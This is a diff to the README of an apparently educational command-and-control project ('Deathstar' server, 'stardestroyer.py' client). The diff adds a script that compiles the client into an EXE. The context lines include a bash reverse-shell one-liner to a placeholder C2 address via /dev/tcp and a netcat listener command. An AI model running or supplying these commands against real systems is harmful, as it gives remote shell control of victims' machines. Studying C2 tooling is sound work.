@@ -3,7 +3,9 @@ Build and understand C2 infrastructure.
 
 `Deathstar` has a webpage, or a terminal based C2 connection manager.
 
-`Stardestroyer.py` is one option of calling into the C2 server.
+`stardestroyer.py` is one option of calling into the C2 server.
+
+`compiler.sh` will compile `stardestroyer.py` into an EXE.
 
 
 ![screen](https://github.com/user-attachments/assets/7de184fa-cd0b-4cbf-b701-9f505a77cb2a)
@@ -27,6 +29,10 @@ or
 Linux / MacOS
 
 `bash -i >& /dev/tcp/<C2-IP>/9999 0>&1`
+
+or
+
+`./stardestroyer.py`
 
 # Start your listener 
 `nc -nvlp 4444`
